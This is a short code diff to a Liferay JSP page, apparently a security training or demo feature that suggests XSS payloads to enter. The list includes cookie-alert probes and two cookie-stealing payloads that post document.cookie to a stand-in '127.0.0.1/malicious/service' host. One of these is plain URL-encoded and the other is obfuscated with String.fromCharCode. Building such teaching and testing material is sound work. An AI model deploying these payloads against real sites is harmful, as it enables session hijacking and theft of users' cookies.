@@ -47,7 +47,7 @@ String lastName = GetterUtil.getString(renderRequest.getAttribute("lastName"));
 		"'+eval(unescape(\"alert%28document.cookie%29\"))+'",
 		"< img src=# onerror=javascript:alert(String.fromCharCode(88,83,83)) >< /img >",
 		"< script > alert('remove-spaces-and-see-what-happens-after-submit') < / script >",
-		"'+eval(unescape(\"var%20url%20%3D%20%22http%3A//127.0.0.1/malicious/service%22%3B%20%24.post%28url%2CJSON.stringify%28%7B%22location%22%3A%20window.location%2C%20%22cookies%22%20%3A%20document.cookie%7D%29%29\"))+'"
+		"';eval(String.fromCharCode(118,97,114,32,117,114,108,61,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,109,97,108,105,99,105,111,117,115,47,115,101,114,118,105,99,101,34,59,36,46,112,111,115,116,40,117,114,108,44,34,99,111,111,107,105,101,115,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59));'"
 	];
 	function xssInjectionSuggestions(index) {
 		event.preventDefault();
